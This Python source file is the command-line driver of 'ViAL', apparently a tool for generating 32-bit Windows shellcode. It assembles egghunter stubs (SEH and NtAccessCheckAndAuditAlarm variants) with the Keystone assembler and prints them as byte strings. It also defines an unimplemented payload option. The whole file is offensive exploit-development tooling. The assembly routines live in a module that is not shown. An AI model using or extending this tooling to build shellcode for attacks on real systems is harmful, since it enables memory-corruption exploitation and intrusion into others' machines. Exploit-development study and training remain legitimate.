#!/usr/bin/python

import argparse
import sys
from keystone import *
from rich.console import Console
from lib.core import Payload

console = Console()

BANNER = '''[green]
Y88b      / 888      e      888     
 Y88b    /  888     d8b     888     ViAL ---
  Y88b  /   888    /Y88b    888     venomous injected assembly library
   Y888/    888   /  Y88b   888     
    Y8/     888  /____Y88b  888     
     Y      888 /      Y88b 888____
[/green]'''

def print_shellcode(code):
    ks = Ks(KS_ARCH_X86, KS_MODE_32)
    encoding, count = ks.asm(code)
    console.print("[INFO] Encoded %d instructions..." % count)

    shellcode = ""
    for dec in encoding: 
        shellcode += "\\x{0:02x}".format(int(dec)).rstrip("\n") 
    console.print(f"[INFO] Generated shellcode ({len(shellcode)} bytes):"
                  "\nbuf = (\"" + shellcode + "\")")

def main(args):
    console.print(BANNER)

    if args.egghunter:
        tag = args.tag
        op = args.egghunter[0]

        if len(tag) != 4:
            tag = Payload.DEFAULT_TAG
            console.print("[yellow][WARN][/yellow] Tag must be four (4) characters!")
            console.print(f"[INFO] Using default tag {tag}")

        console.print(f"[INFO] Generating {op} egghunter with tag {Payload.tag_to_hex(tag)} ({tag})")

        if (op.lower() == 'seh'):
            tag = Payload.tag_to_hex(tag)
            print_shellcode(Payload.generate_egghunter_seh(tag))
        elif (op.lower() == 'ntaccess'):
            tag = Payload.tag_to_hex(tag)
            print_shellcode(Payload.generate_egghunter_ntaccess(tag))
        else:
            console.print(f"[WARN] No matching egghunter found for '{op}'!")

if __name__ == '__main__':

    parser = argparse.ArgumentParser(
        description = "Creates a 32-bit Windows assembly payload"
    )

    exclusive_group = parser.add_mutually_exclusive_group()
    exclusive_group.add_argument(
        '--egghunter',
        help = "Generate a 32-bit Windows SEH or NtAccessCheckAndAuditAlarm egghunter",
        action = 'store',
        type = str,
        nargs = 1,
    )
    exclusive_group.add_argument(
        '--payload',
        help = "Generate a 32-bit Windows payload",
        action = 'store',
        type = str,
        nargs = 1,
    )
    exclusive_group.add_argument(
        '--list',
        help = "List available payloads",
        action = 'store_true',
    )

    parser.add_argument(
        '--tag',
        help = f"Egghunter tag to use (default: {Payload.DEFAULT_TAG})",
        action = 'store',
        type = str,
        default = Payload.DEFAULT_TAG
    )

    if len(sys.argv) > 1:
        args = parser.parse_args()
        main(args)
    else:
        parser.print_help()
        sys.exit()